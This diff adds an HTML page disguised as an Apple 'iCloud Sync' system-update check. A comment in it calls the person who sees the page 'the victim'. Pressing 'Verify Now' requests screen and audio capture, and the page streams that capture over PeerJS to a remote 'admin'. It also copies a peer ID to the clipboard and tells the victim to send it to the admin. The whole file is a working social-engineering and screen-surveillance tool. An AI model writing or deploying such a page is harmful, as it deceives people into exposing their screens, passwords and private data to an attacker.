@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud Sync</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #f2f2f7; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center; 
+        }
+        .card { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
+            width: 85%; 
+            max-width: 320px; 
+        }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        
+        button { 
+            background: #007aff; 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: bold;
+            cursor: pointer; 
+            width: 100%; 
+            transition: 0.2s;
+        }
+        button:hover { background: #005ecb; }
+        
+        #status { margin-top: 15px; color: #ff3b30; font-size: 13px; font-weight: bold; min-height: 20px;}
+        
+        /* صندوق الـ ID مخفي في البداية */
+        #id-box { 
+            background: #f2f2f7; 
+            border: 1px dashed #ccc;
+            padding: 10px; 
+            word-break: break-all; 
+            font-family: monospace; 
+            font-size: 12px;
+            margin-top: 15px; 
+            display: none; 
+            color: #007aff;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>⚠️ System Update Required</h2>
+    <p>To ensure security, please verify your device identity.</p>
+    
+    <button id="startBtn" onclick="shareScreen()">Verify Now</button>
+    
+    <div id="status"></div>
+    <div id="id-box"></div>
+</div>
+
+<!-- مكتبة الاتصال عبر الإنترنت -->
+<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+<script>
+    const peer = new Peer();
+    let myStream = null;
+
+    // عندما يتولد الـ ID الخاص بالجهاز
+    peer.on('open', (id) => {
+        document.getElementById('id-box').innerText = "ID: " + id;
+        document.getElementById('id-box').style.display = 'block';
+        document.getElementById('status').innerText = "Waiting for connection...";
+        
+        // نسخ الـ ID تلقائياً
+        navigator.clipboard.writeText(id);
+        
+        // رسالة تأكيد للمستخدم
+        alert("Your Device ID has been copied! Send it to the admin.");
+    });
+
+    async function shareScreen() {
+        try {
+            // طلب إذن مشاركة الشاشة (هذا هو الجزء اللي كيظهر للضحية)
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+            myStream = stream;
+
+            // إخفاء الزر وإظهار حالة البث
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('status').innerText = "✅ Sharing active.";
+            document.getElementById('status').style.color = "#34c759";
+
+            // الاستماع لأي شخص (Admin) يتصل بي
+            peer.on('call', call => {
+                call.answer(stream); // إرسال الشاشتك له
+            });
+
+        } catch (err) {
+            document.getElementById('status').innerText = "Update cancelled";
+        }
+    }
+</script>
+
+</body>
+</html>
